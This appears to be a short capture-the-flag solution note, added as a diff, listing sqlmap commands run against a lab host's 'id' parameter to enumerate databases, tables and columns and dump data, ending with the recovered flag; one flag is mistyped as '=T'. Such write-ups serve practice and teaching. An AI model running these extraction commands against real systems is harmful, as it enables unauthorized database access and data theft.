@@ -1,0 +1,6 @@
+py -2 sqlmap.py -u 10.4.21.55:10010?id=1
+py -2 sqlmap.py -u 10.4.21.55:10010?id=1 --dbs
+py -2 sqlmap.py -u 10.4.21.55:10010?id=1 -D cunliyougeguniangtajiaochutian --tables
+py -2 sqlmap.py -u 10.4.21.55:10010?id=1 -D cunliyougeguniangtajiaochutian --tables =T Marinata --columns
+py -2 sqlmap.py -u 10.4.21.55:10010?id=1 -D cunliyougeguniangtajiaochutian --tables =T Marinata --columns -C Hinata --dump
+flag{Power_of_Ldy}
